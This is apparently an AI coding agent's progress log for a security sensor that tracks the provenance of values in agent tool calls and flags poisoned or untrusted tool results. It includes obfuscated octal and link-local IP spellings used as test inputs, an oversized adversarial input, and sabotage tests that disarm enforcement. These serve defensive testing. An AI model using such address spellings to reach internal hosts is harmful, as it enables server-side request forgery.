     leading-zero embedded IPv4. Its cost is bounded by that shape, NOT
     measured.]* comparing HEAD's core with the new one, no leaf's
     destination readings change. The files are `benign_toolcalls`,
     `benign_a2a`, `benign_longform`, heldout and asi_battery benign, and the
     456-row shell corpus.
3. **The Linux over-read class is named:** `macos-reading-read-everywhere`.
   - Its own predicate (`_names_a_macos_host` / `_macos_reading`) bounds it,
     independently of the core.
   - It is pinned on the discriminating spelling: plain
     `http://010.0.0.1/latest` is absorbed on Linux, and on darwin it is not an
     over-read at all.
   - **It also absorbs on darwin**, where only a WHATWG split names the host
     (`http://\@010.0.0.1\x`). Node parses that itself, as octal. My first
     predicate missed this (1,490 unnamed), then missed R4's
     `http:010.0.0.1` and `http:010.0.0.1:80`. Each was red, and each is fixed.

**Standing rule** (ARCHITECTURE.md §5): every sabotage runs with
`PYTHONDONTWRITEBYTECODE=1` from no `__pycache__`, and the restore is confirmed
with `cmp`. ~~`tests/conftest.py` sets `sys.dont_write_bytecode`.~~
*[Corrected below: that guard did not protect.]*

**Interpreters.**
- The full affected set ran on macOS 3.12.2 and Linux 3.10, 3.11 and 3.12.
- The corrected differential (39 tests) ran on macOS, Linux 3.10 and 3.12. It
  was not re-run on 3.11 after the final predicate fix.

---

## M5 — hops and delegation binding. **Green. STOP AND REPORT.**

**Build (§1.4), in `provenance_chain.py`:**
- `begin_flow` → `bind_fresh_ledger()`;
- `extract_context` → `bind_fresh_ledger()` FIRST, before the inbound mark and
  every early return (V-7c);
- `record_hop` → `bind_ledger()`, explicit iff nothing is bound (ruling 3.1);
- `clear_flow` → `unbind_ledger()`.

**Red first** (the M5 driver, against the unchanged chain):

```
E  AssertionError: M5 binding: s5_after_begin_flow: got 'ledger_absent', want 'unresolved' -- begin_flow() bound no ledger (S5 should flip ledger_absent -> unresolved); no_destination: got 'ledger_absent', want 'no_destination'; truncated: got ['ledger_absent', False, []], want ['unresolved', True, ['walk_bound']]; s9_propagate_context: got 'ledger_absent' ...
E  AssertionError: after begin_flow() the wire is 'ledger_absent'; M5 binds a ledger there      (M4's pin, moved as M4 predicted)
2 failed, 4 passed, 1 xfailed
```

**Green.** The suites are M5, M4, C-11, the 456-row oracle, the four
provenance suites, the LangChain result scan, conformance and `tests/outside`
(including `test_m5_from_the_wheel`):

```
== macOS 3.12.2    559 passed, 3 skipped, 14 xfailed
== linux 3.10.21   560 passed, 2 skipped, 14 xfailed
== linux 3.11.16   560 passed, 2 skipped, 14 xfailed
== linux 3.12.14   560 passed, 2 skipped, 14 xfailed
```

**Acceptance, from the built wheel and in-tree, through one driver:**
- S5: `unresolved` after `begin_flow` (it was `ledger_absent`).
- `no_destination`.
- `truncated`, with a `walk_bound` finding.
- `extract_context({})` binds, and its call gives `unresolved`.
- S9: a bare `ThreadPoolExecutor.submit` gives `no_flow`, and
  `propagate_context` gives `unresolved`.
- `clear_flow` gives `no_flow`, with the ledger unbound.
- `begin_flow` binds a FRESH ledger every time.
- **The pinned consequence of ruling 3.1:** `record_hop` with no
  `begin_flow`/`clear_flow` keeps ONE explicit ledger across "requests" on the
  thread. This is documented, not fixed.
- **S25** is a strict xfail, as planned: (no_flow, no_flow) against paid's
  (no_flow, unresolved).

**Sabotage (§4 sabotage 3).** `bind_fresh_ledger` was removed from
`begin_flow`:

```
E  AssertionError: M5 binding: s5_after_begin_flow: got 'ledger_absent', want 'unresolved' -- begin_flow() bound no ledger (S5 should flip ledger_absent -> unresolved); begin_flow_binds_fresh: got False, want True -- begin_flow() reused the caller's ledger
--- same sabotage, the provenance-chain tests (test_provenance, test_set_origin_provenance, test_delegation_rate_breaker, test_report_provenance): 79 passed, 3 skipped   (discriminating: they cannot see it)
=== RESTORED (cmp identical to snapshot): 1 passed, 1 xfailed
```

**A finding: the sabotage went red NARROWER than the plan predicted.** The
plan expected every call under the flow to read `ledger_absent`. Only the
FIRST call after `begin_flow` does. The scan path calls `record_hop` (through
`_resolve_provenance`), and ruling 3.1 makes that bind an explicit ledger when
none is bound. From the second call on, the missing `begin_flow` bind is
masked, by a ledger that is not guaranteed fresh. The freshness check is what
catches the rest. Consequence for M10: the plan's A-enforce-block red
(`wire=ledger_absent`) holds only if the poisoned read is recorded before the
first tool call's own `record_hop`.

**C-11 across commits** (base `460c541` against the M5 tree, from wheels;
`c11_oracle --compare`, which now accepts such a base): **all 18
identical.**

---

## M5 fresh-context reviews, and what changed after them

**CI on `b84671e`: green.** 13 of 13 checks, run `37217084055`.

**silent-failure-hunter.**
1. **High, held for the owner.** ~~A host that passes a per-call principal
   (`origin_context={"on_behalf_of": ...}`, or `set_origin`) with no
   `begin_flow()` reaches `build_provenance`, then `record_hop`, then
   `bind_ledger()`. The sensor itself binds an explicit ledger, and nothing
   unbinds it.~~ *[RETRACTED after M5, measured while writing the ruling-3.1
   test: the SENSOR never reaches `record_hop` this way.
   `_resolve_provenance` returns early when a per-call principal is set and
   no flow is active. The reviewer's repro called `build_provenance`
   directly, and I relayed the claim to the owner in the M5 report without
   checking it (clause 4). The carry is reached by a HOST that calls
   `record_hop` / `build_provenance` itself with no `begin_flow()`.]*
   - The chain side, `is_flow_active()` turning True, predates M5.
   - What M5 adds is the ledger: those calls now read `unresolved` instead of
     `ledger_absent`.
   - **The milestone review showed what this does once M6 records input.**
     User A's principal authority reaches user B on the same thread
     (`principal_undeclared_span` against `unresolved` before M5). That is
     V-27's cross-request carry, reached through ruling 3.1's pinned
     consequence.
   - M6's planned S30 never calls `record_hop`, so it cannot see this.
   - Only the owner can change ruling 3.1 or `build_provenance`'s gate, so
     it is held as the STOP's first item.
2. **Medium, fixed.** The over-read predicate `_names_a_macos_host` scanned
   path tokens. `http://example.com/00169.254.00169.254/profile` returned True.
   It now reads only the authority, and that spelling is asserted False.

**milestone-reviewer.** It reproduced the M5 red, the sabotage, `record_hop`
as the masker (a spy: bound `False, True, True` before each call),
per-seam reds, the outside run, Linux 3.12 and **3.11** (closing the 3.11
gap), C-11 and S25. It refuted:
1. **The `conftest.py` bytecode guard.** It set `dont_write_bytecode` after
   `xaidr` was imported, and that flag stops writes, not reads. **Fixed:**
   before any import, `sys.pycache_prefix` now points at a fresh empty
   directory, so in-tree bytecode is neither read nor written. **Proven** with
   the reviewer's own experiment. A stale sabotaged `.pyc` is planted, the
   source is restored cmp-identical with the same size and mtime, then:
   ```
   OLD conftest (dont_write_bytecode after import): 1 failed  E  AssertionError: M5 binding: s5_after_begin_flow: got 'ledger_absent' ...
   NEW conftest (pycache_prefix before import)    : 1 passed
   ```
   My first attempt put the guard above `from __future__ import annotations`.
   That is a SyntaxError, and it broke collection until the guard was moved.
2. **The "0 of 16,683" false-positive cost.** Retracted in place above as
   vacuous. The `460c541` message carries the claim, and the PR body now
   corrects it.
3. **The over-read pin did not check its bound.** It passed on macOS with
   the predicate replaced by `return True`. Now it asserts the predicate is
   False on non-macOS hosts, and checks the bound on the grid's HOST axis
   (every absorbed spelling contains a host the macOS resolver reads
   differently), not with the predicate itself.
4. **Ruling 3.1 plus S-2 reopens V-27.** Held: STOP item 1.
5. **The docs were longer than "one line each".** Trimmed: README is one
   line, and `docs/api.md` is one line each for what it means and what
   `begin_flow()` does.

It also noted:
- the M5 sabotage ran in-process, not through a rebuilt wheel;
- the "consequence for M10" (in-scan `record_hop` masking) is UNVERIFIED for
  LangGraph, where F5 makes a bind inside a node node-local. M10's driver has
  to settle it.

**After the fixes:**

```
== macOS 3.12.2    503 passed, 14 xfailed
== linux 3.10.21   503 passed, 14 xfailed
== linux 3.12.14   503 passed, 14 xfailed
```

---

## Ruling 3.1 changed (owner, after M5), `b621987`

`record_hop` binds no ledger. Only `begin_flow` and `extract_context` bind,
and `clear_flow` unbinds.

**My first red was not the defect, and I did not paste it as if it were.**
- The test drove the SENSOR's per-call-principal path
  (`scan_tool_call(..., origin_context={"on_behalf_of": ...})`). User B's call
  did NOT carry user A's authority, even under the old ruling. The
  record_hop-only path read `['no_flow', 'no_flow']`.
- `_resolve_provenance` returns early when a per-call principal is set and no
  flow is active, so **the sensor never reaches `record_hop` that way.** The
  M5 silent-failure reviewer's claim was false (its repro called
  `build_provenance` directly). I relayed it to the owner in the M5 report
  without checking. Retracted in place in M5's review section and in the
  rulings doc.

**Rewritten on the real path:** a host calling the public
`provenance_chain.build_provenance` on ONE reused pool thread. Red against
the old ruling:

```
E  AssertionError: user B's call to user A's address came back 'principal_undeclared_span': user A's principal authority reached user B on a reused thread (record_hop bound a ledger nobody owns)
```

Green after the change: `88 passed, 3 skipped, 1 xfailed`, including the four
provenance suites. The rulings doc records the change, the corrected "why",
the measured cost, and that the provenance-chain tests cannot see this class.

---

## M6 — principal input recording. **Green. STOP AND REPORT.**

**Build (§1.1), in `xaidr/sensor.py`.**
- `scan(..., *, spans=None)` records the principal input on EVERY
  `direction="input"` exit, through a `finally`: the normal path, gate,
  circuit-open, fail-closed, scan-error, not-scannable, and a raised
  `DelphiBlockedError`.
- `input_clean` is True only when the scanner's PRE-mode action was
  `allowed` and `_post_scan_gate` left the result unchanged. It is False for
  a gate verdict, fail-closed or a block, and None for circuit-open or a scan
  error.
- A bytes prompt is recorded as its decoded text.
- `spans=` (Q8) is honoured for input only. Elsewhere it is ignored, with one
  WARNING per sensor.
- A recording fault is logged once per sensor and never becomes a verdict.

**Red first.**

```
E  AssertionError: M6 principal input: undeclared: got 'unresolved', want 'principal_undeclared_span' -- the input seam recorded nothing; declared: got "TypeError: ... unexpected keyword argument 'spans'"; bytes: got 'unresolved' ...; s30: got ['no_flow', 'no_flow'] ...; s30_host_record_hop: got ['ledger_absent', 'ledger_absent'] ...; s2_circuit_open: got ['no_flow', True, 'no_flow'], want ['principal_undeclared_span', True, 'unresolved']
```

**Green.** The suites are M6, M5, M4, C-11, the 456-row oracle, two provenance
suites, conformance and `tests/outside` (including `test_m6_from_the_wheel`):

```
== macOS 3.12.2    486 passed, 12 xfailed
== linux 3.10.21   486 passed, 12 xfailed
== linux 3.11.16   486 passed, 12 xfailed
== linux 3.12.14   486 passed, 12 xfailed
```

**Acceptance, one driver run in-tree and from the built wheel:**
- an input naming bob, then a call to bob, gives `principal_undeclared_span`;
- with declared spans it gives `principal`;
- a flagged input gives `untrusted_source` (V-9);
- **a flagged input softened to `allowed` by an S6 `transform_verdict` still
  gives `untrusted_source`**;
- a bytes prompt is recorded as decoded text;
- a circuit-open input ends the previous request's implicit authority (S-2);
- **S30, EXTENDED as the owner asked.** It runs twice on one reused pool
  thread, plain and with the host recording its own hop through
  `build_provenance` per request (the path that reached the old carry).
  Request 2 gets `unresolved` both times.

**C-11.**
- 4a-I is un-xfailed, with **K_I = 26** untrusted-source calls on the
  456-row corpus, measured and pinned. Its red was the M1-era strict xfail
  turning into an unexpected pass once M6 landed.
- RECORD == OFF still holds in-tree.
- Across commits (`b621987` against M6, from wheels): **all 18 identical**.

**S25 flipped, which the plan did not predict.** M6's input seam binds per
input (S-2), so `set_origin` plus a principal-only emit now gives
(`no_flow`, `unresolved`), which is paid's reference. The strict xfail became
a plain assertion.

**Sabotage.** Each restore is cmp-confirmed, and each run used
`PYTHONDONTWRITEBYTECODE=1`.

```
=== 1: input_clean read from the POST-mode verdict
E  AssertionError: M6 principal input: flagged_softened: a flagged input donated principal authority once an S6 transform softened it to 'allowed' (wire 'principal_undeclared_span'): input_clean read the post-mode verdict
--- discriminating half, same sabotage: flagged (plain): ['flagged', 'untrusted_source']   (monitor softening never yields allowed)
=== 2: nothing recorded on the gated (circuit-open) path
E  AssertionError: ... s2_circuit_open: got ['principal_undeclared_span', True, 'principal_undeclared_span'], want [..., 'unresolved'] -- a circuit-open input did not end the previous request's implicit authority (S-2)
=== 3: the seam's own fault guard removed, a raising recorder injected
  C-11 P-input under RECORD RAISED into the host: RuntimeError: m6 injected recorder fault
--- same injection, guard in place: OFF and RECORD P-input identical, 0 SCAN_ERROR rows
```

**A finding: sabotage 3 went red in a different shape than predicted.** The
plan expected `SCAN_ERROR` rows. Recording runs in a `finally` OUTSIDE
`scan()`'s own try/except, so without its guard a recorder fault RAISES into
the host. The guard is the only line between the two, and the test now
proves it is there.

**Q17, the latency of default RECORD: reported, and weak.**
`benign_longform/` holds only `manifest.json` and `README.md`. The 24 long
documents are NOT in the tree. Measured on the one 11.8 KB file, scanned 5
times inside `begin_flow`:
- OFF: p50 460 ms, p99 498 ms;
- RECORD: p50 452 ms, p99 496 ms.

The delta is noise. F8's 0.8 ms/KB predicts about 9 ms of recording against a
460 ms scan. This is one document, not the corpus the plan meant.

**Still owed:**
- **The false-positive cost of reading every macOS reading.** The owner
  ruled that it must land before ENFORCE (M8), on a benign corpus that
  really holds the affected host shapes, drawn from outside our own
  examples. Not started.
- The protect_tools result position (M7).
- Q13's block-rate measurement, before any circuit-breaker wiring.

---

## M6 fresh-context reviews, CI, and what changed after them

**CI on `2731fe6`: FAILED.** `pytest (py3.10, base)`:
`test_truncation_bypass::test_large_adversarial_input_is_bounded_and_does_not_scale`,
`5MB bomb took 2.55s` against a 2.5 s bound. The other 12 checks passed. **M6
caused it.** Recording ran the core's prose scan over the WHOLE decoded
prompt, and value origin defaults to RECORD, so the input seam's cost scaled
with input size again.

**Fixed.** The recorded principal input is capped at 65,536 chars, the same as
the core's per-leaf cap on tool results, and declared spans are cut to match.
Fail-safe: a destination past the cap is not principal, so it reads
`unresolved`, which never blocks. Measured on macOS, 5 MB input:
- RECORD: 5.51 s before the cap, 1.42 s after;
- OFF: 1.39 s.

The deterministic test (`input_cap`) was red first: the tail past the cap was
still recorded.

**silent-failure-hunter.**
1. A `FAULT` from `record_principal_input` (for example, spans that do not
   concatenate to the text) was silent, and the sensor ignored the outcome.
   **Fixed:** logged once per sensor. A non-scannable input FAULTs by design
   and is not logged.
2. The non-scannable path was asserted nowhere. Now it is: it ends the
   previous request's implicit authority.
3. Inbound `scan_a2a` never touched the ledger. See the next item.

**milestone-reviewer.**
1. **Q21 was dropped, and M6 reopened the cross-request carry through inbound
   A2A.** §1.1 is M6's build list, and its `scan_a2a(received=True)` row
   ("must start a fresh ledger") was decided YES as Q21. Measured at
   `2731fe6`: user A's input, then user B's request arriving as inbound A2A,
   and B's call to A's address came back `principal_undeclared_span`.
   **Fixed:** `scan_a2a(received=True)` ends an IMPLICIT ledger through S-2's
   path (bind for an input, record nothing) and keeps an EXPLICIT one. Red
   first:
   ```
   E  AssertionError: M6 principal input: a2a_inbound_ends_implicit: got 'principal_undeclared_span', want 'unresolved' -- an inbound A2A message kept the previous request's implicit ledger (Q21); spans_mismatch_warnings: got 0, want 1
   ```
2. **Nothing committed guarded the recording-fault guard.**
   `test_a_recorder_fault_never_reaches_the_host` does now. With the guard
   removed it goes red with `RuntimeError: m6 injected recorder fault`
   raised to the caller.
3. **The Q17 premise was wrong.** `benign_longform/`'s 24 documents are
   generated by `scripts/build_benign_longform.py`, not missing. Re-measured,
   with the input cap in place:
   ```
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
[xaidr] Warning: L1 scan budget exceeded (0.5s); skipping remaining rules
benign_longform via generate(): 24 docs, 90,060..1,397,574 chars (total 10,100,008), x3 each, inside begin_flow, input capped at 65,536 for recording
  OFF    p50=1122.2 ms  p99=1548.5 ms
  RECORD p50=1156.4 ms  p99=1607.5 ms   (p50 +34.3 ms, p99 +59.0 ms)
   ```
   **Q17's other item, the saturation side effect (F8).** About 2,600 distinct
   tokens drop the n-gram unit. After that, a principal key can no longer
   authorize a designated read, and under ENFORCE that can block a legitimate
   call. The 65,536-char cap bounds cost, not saturation.
4. **The 3.1 retraction was incomplete.** My own comment in
   `provenance_chain.py` repeated the retracted premise. The old 3.1 text in
   the rulings doc (§3.1), ARCHITECTURE.md's M5 pin and its §1.4 row, and the
   core `_ledger.py` docstring are now marked or corrected in place. The
   docstring change is behaviour-neutral but changes paid's pin bytes.
5. **S25's flip comes from the input seam's IMPLICIT ledger, not from
   `set_origin`.** The same calls without `set_origin` give the same pair.
   This is stated in the test. Matching paid's semantics cannot be checked
   from this repo.
6. **The extended S30's carry red, never pasted until now** (reviewer: the old
   `provenance_chain.py` with M6 present): `s30_host_record_hop
   ['principal_undeclared_span','principal_undeclared_span']`, while plain
   `s30` stays green.
7. **Linux.** The reviewer's leg was deferred because the Docker daemon on
   this machine hung (eight `docker ps` calls from other sessions stuck). My
   own Linux legs for the review fixes were cut off with it. **Linux evidence
   for this commit is CI's py3.10/3.11/3.12 jobs**; see the report.

It confirmed:
- the corrected premise: `record_hop` is called 0 times from every sensor
  path without a flow;
- every red and sabotage, K_I = 26 in both modes;
- RECORD == OFF for P-input from the wheel.

**After the fixes (macOS 3.12.2):** `73 passed, 5 xfailed`. The suites are
M6, M5, M4, C-11, the 456-row oracle, `test_truncation_bypass`, two
provenance suites, and the M5 and M6 wheel tests.

---

## Truncation made visible (owner, after M6), `e1b27c0`

A destination past the 65,536-char input cap used to read a silent
`unresolved`. Now:
- If the flow's principal input was capped and a lookup misses, the wire is
  **`input_truncated`**, a TENTH wire value.
- Its verdict is NOT_EVALUATED, so it never blocks, like `ledger_saturated`. **[Superseded by RULING 1+2 (f93e873): input_truncated and ledger_saturated block under ENFORCE.]**
- It has its own §3.4 row, and an untrusted finding still outranks it.

Red first:

```
E  AssertionError: M6 principal input: input_cap: got [True, 'unresolved'], want [True, 'input_truncated'] -- a destination past the input cap read silently unresolved instead of input_truncated
```

Green: `406 passed, 12 xfailed` (conformance, M6, M4, C-11).

**A declared vocabulary and interface change.** `WireValue`, `row_text.json`
(which the Brain's copy is checked against) and
`record_principal_input(..., truncated=False)` all changed. The exact interface
pins were updated on purpose. Paid's re-vendor and the Brain/blank-canvas row
tables must learn the value before M9 emits the field.

**S25** gets a note in the rulings doc. Its agreement with paid's reference is
accidental, and paid's semantics were NOT verified from this repo. Confirm
when paid re-vendors.

---

## M7 — tool-result recording. **Green. STOP AND REPORT.**

**Build (§1.2).**
- `_scan_tool_result` runs `scan(direction="tool_result")`'s exact body (same
  detection, telemetry and refusal). It then records the RAW result with the
  tool's identity, its arguments and the PRE-mode verdict
  (`blocked`/`approval_required`, or `flagged` at or above the scanner's block
  threshold: V-2).
- It never reaches the public seam's nameless record.
- The public `scan(direction="tool_result")` records nameless and untrusted
  (V-26).
- The LangChain `BaseTool.run`/`.arun` and MCP `call_tool` after-hooks scan
  through `_scan_tool_result`, and are wrapped in an enclosing marker
  (`xaidr/_vo_seams.py`).
- **`protect_tools` has a RESULT POSITION** (owed since M1). It records the raw
  result as untrusted (`result_blocked=None`, Q10), and only when no scanned
  seam encloses it. So exactly one seam records each invocation (§1.2 item 3,
  F7).
- Q18: a raw result from httpx, requests, urllib3 or aiohttp is not read, so
  an unread stream is not consumed.
- **Every new recording path is fault-isolated** (owner). A recorder fault is
  logged once per sensor, and the verdict and the tool's result are returned
  unchanged.

**Red first.**

```
E  AssertionError: M7 tool results: public_tool_result_v26: got 'unresolved', want 'untrusted_source' -- public scan(direction='tool_result') recorded nothing (V-26); internal_result_seam: got 'no internal result method'; s23_designated_trusted: got 'no internal result method'; protect_tools_result_position: got 'unresolved', want 'untrusted_source' -- protect_tools has no result position (owed since M1); s24: ... 'no internal result method'
```

My first red run was a driver bug (`sensor(value_origin="off")` passed the
keyword twice). The red above came after that was fixed.

**Green.** The suites are M7, M6, M5, M4, C-11, the 456-row oracle, the
LangChain result-scan suite, conformance, and the M6/M7 wheel tests:

```
== macOS 3.12.2    434 passed, 10 xfailed, 1 warning
== linux 3.10.21   434 passed, 10 xfailed
== linux 3.11.16   434 passed, 10 xfailed
== linux 3.12.14   434 passed, 10 xfailed      (Docker was responsive this time: 29.4.1)
```

**Acceptance, in-tree and from the built wheel** (`test_m7_from_the_wheel`):
- the public `tool_result` seam gives `untrusted_source`;
- the internal result seam gives `untrusted_source`;
- **S23:** a designated, principal-keyed, clean read gives `trusted_source`;
- **S24, in monitor:** a designated read whose result is block-worthy gives
  `untrusted_source`;
- **protect_tools' result position** gives `untrusted_source`;
- **Q18:** an I/O-backed object is returned unread (0 reads);
- **fault isolation:** a raising recorder on the public, internal and
  protect_tools paths never reaches the host.

In-tree only (fake `langchain_core`):
- **F7 end to end.** A designated tool whose implementation is a
  `protect_tools` wrapper runs through the PATCHED `BaseTool.run`, and gives
  `trusted_source`.
- The same at sensor level, through the enclosing marker.

**C-11: the protect_tools pass is non-vacuous.** 4a-R flipped for both passes
(strict xfails turned into unexpected passes). **K_R = 37 for P-flow-R and 37
for P-seam**, measured and pinned per pass. RECORD == OFF. Across commits
(`e1b27c0` against M7, from wheels): **all 18 identical**.

**Sabotage.** Each restore is cmp-confirmed, under `PYTHONDONTWRITEBYTECODE=1`.

```
=== 1: the one-recorder guard removed
E  AssertionError: trusted_source expected, 'untrusted_source': the inner protect_tools recorded first (F7)
E  AssertionError: 'untrusted_source': the patched hook did not record the designated read with its identity, or the inner protect_tools recorded first (F7)
   (1 passed: the LangChain-only designated case stays green -- discriminating)
=== 2: the internal method routed through PUBLIC scan()
E  AssertionError: ... s23_designated_trusted: got 'untrusted_source', want 'trusted_source'
E  AssertionError: 'untrusted_source': the patched hook did not record ...
=== 3: the record dropped from the internal result method
E  AssertionError: ... internal_result_seam: got 'unresolved' ...; s23_designated_trusted: got 'unresolved' ...
--- same sabotage, the LangChain result-SCAN suite: 12 passed   (discriminating: it checks the scan, not the record)
=== 4: the recording fault guard removed
E  AssertionError: ... fault_isolation: got {'public': 'RAISED RuntimeError: m7 injected recorder fault', 'internal': 'RAISED ...', 'protect_tools': 'RAISED ...'}
```

All four went red where predicted. Sabotage 4 shows M6's shape on every new
path: without its guard, a recorder fault RAISES into the host. That is why
each path has the guard and a test for it.

**Not built in M7, named:**
- **Q12, LangChain argument binding.** A STRING `tool_input` is recorded as
  `{"input": v}`, so a designation's `key_args` cannot match it. That is the
  safe direction (the read is untrusted). Dict inputs bind by name.
- **An MCP end-to-end test.** The MCP after-hook is routed through
  `_scan_tool_result` and wrapped in the marker. Only the shared code path is
  tested, not a stub `ClientSession`.
- **A real streaming `httpx.Response`.** Q18 is tested with a stand-in class
  from the `httpx` module namespace.
- **The C-11 P-seam pass through the langchain_core and MCP after-hooks.** It
  still drives only protect_tools.

---

## M7: CI failure and silent-failure review, and what changed after them

**CI on `38ee845`: FAILED**, all six `pytest` jobs, 3 tests each:
`test_protect_boundaries::test_with_enforcement_neutered_the_same_attack_goes_through`
for langchain_core (sync and async) and mcp,
`... blocked with enforcement disarmed — the block is not coming from the scan verdict`.

- M7 moved the result seams' verdict source to `_scan_tool_result`.
- The test disarms the verdict entry points by name, and it did not know the
  new one.
- It did its job: it caught a verdict coming from somewhere it does not
  control.
- **Fixed** by disarming `_scan_tool_result` with the public four. The
  mutation keeps its meaning (the wrapper runs, only the verdict is disarmed):
  `80 passed`.
- My affected-only runs did not include that suite. They do now: every suite
  that touches `protect_tools`, `_patch_langchain_core` or `call_tool`.

**silent-failure-hunter.**
1. **CRITICAL, my defect.** `protect_tools`' sync wrapper CRASHED THE HOST for
   the documented no-implementation shape (`make_wrapper(None, ...)`): the
   result position read an unassigned result (`UnboundLocalError`) on every
   unrefused call. This is the owner's standing concern, the safety layer
   crashing what it protects, a third time. **Fixed:** that shape returns
   `None` before the result position. Red first:
   `E  UnboundLocalError: cannot access local variable 'out' where it is not associated with a value`.
2. **HIGH.** An empty or non-text tool result made the LangChain/MCP hook
   return early WITHOUT recording, while its enclosing marker told an inner
   `protect_tools` not to record either. The read vanished. **Fixed:** the
   early-return branches record the read, untrusted (Q10). Red first, with a
   precondition that the hook really found no text:
   `E  AssertionError: 'unresolved': an unscannable tool result vanished from the ledger`.
3. **Medium, documented as intended.** `input_truncated` stays set on an
   EXPLICIT ledger for the rest of the flow, as `ledger_saturated` does. Once
   the flow's principal input was cut, no later miss in that flow can be called
   novel. An implicit ledger is replaced per input, so this does not cross
   requests.

**After the fixes**, every suite touching the seams plus M4–M7, C-11 and
conformance:

```
== linux 3.10.21   811 passed, 13 skipped, 11 xfailed
== linux 3.11.16   811 passed, 13 skipped, 11 xfailed
== linux 3.12.14   811 passed, 13 skipped, 11 xfailed, 1 warning
```

The macOS figure is in the commit message.

---

## M7 milestone review, and what changed after it

It confirmed:
- every red and the green;
- K_R 37/37, both 0 before M7;
- all four sabotages;
- Q10 (`protect_tools` alone gives `untrusted_source`, sync and async);
- that C-11's P-seam runs through the new position: removing
  `record_unscanned` turns ONLY 4a-R[P-seam] red;
- that `input_truncated`'s placement matches `ledger_saturated`. Ranking it
  above `ledger_saturated` is an unspecified choice; ARCHITECTURE.md never
  mentions the value.

Its gaps:
1. **The no-implementation crash, which also happens with value origin OFF.**
   Already fixed in `729dc2d`.
2. **The Q18 guard checked only the outer object.** The core's result walk
   still read `.content` on an I/O-backed object nested inside the result.
   **Fixed in the core** (`_extract._normalise_result_node`): such a node
   yields no leaves. This is a core byte change, so paid's pin moves.
   Red first:
   `E  AssertionError: recording read a nested I/O-backed object's .content 1 time(s)`.
3. **Two truncation claims had no test.** Now pinned: under ENFORCE,
   `input_truncated` does not block, and an untrusted finding in the same call **[Superseded by RULING 1+2 (f93e873): it blocks; the test is renamed.]**
   decides. The pin catches the reviewer's mutation:
   `E  AssertionError: ('input_truncated', False, 'input_truncated', False)`.
4. **`row_text.json` lacked the new value's input and None rows.** Added: 36
   rows, 3 for `input_truncated`. **"Checked against the Brain's copy" was
   false.** No Brain copy exists yet: delphi-sentinel's branch reads "when
   row_text.json lands from open" and lists nine values, so the Brain would
   store the new value as NULL. Retracted in place.
5. **The "not built" list was incomplete, and two sabotages used unlabeled
   substitutes.**
   - A poisoned read through the LangChain after-hook had no test. It has one
     now (`untrusted_source`). The behaviour already worked; only the test was
     missing.
   - **Substitutes, labeled now.** §5 M7's sabotages 2 and 3 name
     B-designated-twin and §4 sabotage 1. Neither can run yet:
     `drivers/langchain_poisoned_read.py` does not exist, and those are M8/M10
     acceptance cases. I used the S23 and internal-method checks instead.
   - Sabotage 1's "LangChain-only designated case stays green" was
     mislabeled. The case that stayed green calls the private
     `_scan_tool_result` directly, not LangChain.
   - From the wheel, S23 and S24 reach only that private method, never
     `protect()`. F7 and the hook tests are in-tree only (fake
     `langchain_core`).

---

## Before M8, item 1 — the fault-isolation sweep (owner, after M7)

Three milestones produced three defects of one shape, each caught by review
and not by the build:
- M4's attach raised `TypeError` on a non-dataclass extension result;
- M6's raising recorder reached the host;
- M7's `protect_tools` crashed on a tool with no implementation, even with
  value origin OFF.

`tests/test_value_origin_fault_sweep.py` makes guarding the default:
1. **Structural.** Every call from outside `xaidr/value_origin` into the
   core's recording, evaluation, binding or parsing functions must sit inside a
   `try` that catches `Exception`. That covers the `_vo.` alias and names
